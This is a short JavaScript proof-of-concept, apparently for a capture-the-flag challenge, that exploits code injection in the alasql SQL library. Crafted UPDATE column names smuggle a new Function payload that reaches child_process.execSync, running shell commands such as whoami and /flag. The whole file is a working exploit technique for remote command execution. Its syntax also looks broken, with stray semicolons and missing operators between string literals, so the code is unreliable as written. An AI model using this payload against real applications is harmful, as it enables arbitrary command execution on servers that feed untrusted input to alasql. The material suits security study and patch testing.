const alasql = require('alasql');

const genPayload = command => `
new Function(
    'return this.process.mainModule.require'
)()('child_process').execSync(${JSON.stringify(command)})
`;


res = alasql(
    // Initialize the database
    'DROP TABLE IF EXISTS pwnx;' +
    "CREATE TABLE pwnx(a STRING);" +
    "INSERT INTO pwnx VALUES ('x');" +
    "SELECT VALUE a FROM pwnx;";

    // Code injection in four different ways
    //`UPDATE i_am_a_table SET [0'+${genPayload(">&2 echo UPDATE pwned $(whoami)")}+']=42;`
    `UPDATE i_am_a_table SET [0'+${genPayload(">&2 \"sh -c '/flag 2>&1 || true'\",{encoding:'utf8'}")}+']=42;`
      
    //`UPDATE i_am_a_table SET [a'+(r.a=new Function('return this.process.mainModule.require')()('child_process').execSync(\"sh -c '/flag 2>&1 || true'\",{encoding:'utf8'}))+']=42;`
    
    "SELECT VALUE a FROM pwnx;";
);
